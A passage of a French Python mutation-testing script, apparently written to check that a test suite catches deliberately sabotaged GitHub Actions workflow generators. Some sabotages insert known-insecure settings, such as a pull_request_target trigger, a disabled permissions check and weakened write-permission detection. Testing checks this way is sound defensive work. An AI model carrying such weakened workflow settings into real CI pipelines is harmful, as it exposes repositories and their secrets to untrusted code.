        (FABRICANT, '(("series", os.path.basename(CIRCUIT_SERIES), MOTIF_DE_VERSION),\n                      ("examen", os.path.basename(CIRCUIT_CERTIFICATION), "^main$"))',
         '(("series", os.path.basename(CIRCUIT_CERTIFICATION), MOTIF_DE_VERSION),\n                      ("examen", os.path.basename(CIRCUIT_SERIES), "^main$"))')],
    "S39_relais_examen_depuis_toute_version": [
        (FABRICANT, '("examen", os.path.basename(CIRCUIT_CERTIFICATION), "^main$")',
         '("examen", os.path.basename(CIRCUIT_CERTIFICATION), MOTIF_DE_VERSION)')],
    "S40_relais_compte_toujours_les_series": [
        (FABRICANT, 'en_cours=$(gh run list --workflow "$FICHIER"', 'en_cours=$(gh run list --workflow series_longues.yml')],
    # tour 3 : les sabotages de Cowork du tour 2 qui ne mordaient pas (C3, C5, C7), et N5 / N6
    "S41_relais_1000_octets_refuses_C3": [(FABRICANT, '[ "$taille" -le """', '[ "$taille" -lt """')],
    "S42_relais_un_seul_commit_clone_C5": [(FABRICANT, "          fetch-depth: 2\n          persist-credentials: false\n",
                                            "          fetch-depth: 1\n          persist-credentials: false\n")],
    "S43_relais_ne_regarde_que_le_dernier_passage_C7": [(FABRICANT, "--limit 100 --json status", "--limit 1 --json status")],
    "S44_relais_sur_pull_request_target_N5": [(FABRICANT, 'on:\n  push:\n    paths:\n      - "demandes/**"',
                                               'on:\n  pull_request_target:\n    paths:\n      - "demandes/**"')],
    "S45_relais_emploie_gh_api_N6": [(FABRICANT, '          if [ "$A_BLANC" = "oui" ]; then',
                                       '          gh api repos/x/y/actions/runs\n          if [ "$A_BLANC" = "oui" ]; then')],
    "S46_circuit_sans_permissions_admis_N9": [(FABRICANT, '        if not re.search(r"^permissions:", texte, re.M):   # N9',
                                               '        if False:   # N9')],
    "S47_casse_de_la_permission_non_vue_N11": [(FABRICANT, 'write\\b|\\bwrite-all\\b""", re.I)', 'write\\b|\\bwrite-all\\b""")')],
    "S37_relais_ne_compte_que_in_progress_C1_de_Cowork": [
        (FABRICANT, 'select(.status != "completed")', 'select(.status == "in_progress")')],
}


def main():
    """Le programme entier (voir la fiche en tête).

    ① RÔLE — Fiche en tête. ② CONTEXTE D'APPEL — La ligne de commande. ③ ENTRÉE — Fiche en tête.
    ④ CONDITIONS D'ENTRÉE — — ⑤ SORTIE — UNE valeur : 0, 1 ou 2. [rend: 1]
    ⑥ TRAITEMENT — un tour tel quel ; avec --saboter (ou --saboter=S01,S02,… pour en choisir), une copie de la
      racine par sabotage (les quatre fichiers que l'épreuve lit : fabricant, table, joueur, rassembleur), le fichier
      visé écrit saboté, un tour par copie.
    ⑦ UNITÉ — — ⑧ POURQUOI — Fiche en tête. ⑨ CE QUI CLOCHE — —
    ⑩ EFFET — Fiche en tête. ⑪ TERMINAISON — Rend la main. [sort: non]
    """
    faux = tour(DEPOT)
    print("Z0 programmes tels quels : " + ("T0, V0 à V5, P01 à P28, E0 à E7, L1 à L3, F0 à F14, A0 à A14, R1 à R8, V6, P29, G1 à G4 conformes" if not faux else
                                            "FAUX " + " | ".join(faux)))
    code = 1 if faux else 0
    choix = [a.split("=", 1)[1].split(",") for a in sys.argv[1:] if a.startswith("--saboter=")]
    if "--saboter" in sys.argv or choix:
        noms = [n for n in SABOTAGES if not choix or n in choix[0] or n.split("_")[0] in choix[0]]
        for nom in noms:
            d = tempfile.mkdtemp(prefix="relais_series_sab_")
            try:
                for f in (FABRICANT, TABLE, JOUEUR, RASSEMBLEUR):
                    os.makedirs(os.path.dirname(os.path.join(d, f)), exist_ok=True)
                    shutil.copyfile(os.path.join(DEPOT, f), os.path.join(d, f))
                for fichier, a, b in SABOTAGES[nom]:
                    t = open(os.path.join(d, fichier), encoding="utf-8").read()
                    if t.count(a) != 1:
                        print(f"{nom} NE S'APPLIQUE PLUS : texte cible trouvé {t.count(a)} fois dans {fichier}")
                        return 2
                    open(os.path.join(d, fichier), "w", encoding="utf-8").write(t.replace(a, b))
                f = tour(d)
            finally:
                shutil.rmtree(d, ignore_errors=True)
            print(f"{nom} {'mord' if f else 'NE MORD PAS'} : {f[:3]}")
            code |= 0 if f else 1
    print("VERDICT : tout est conforme" if code == 0 else "VERDICT : NON CONFORME")
    return code


if __name__ == "__main__":
    sys.exit(main())
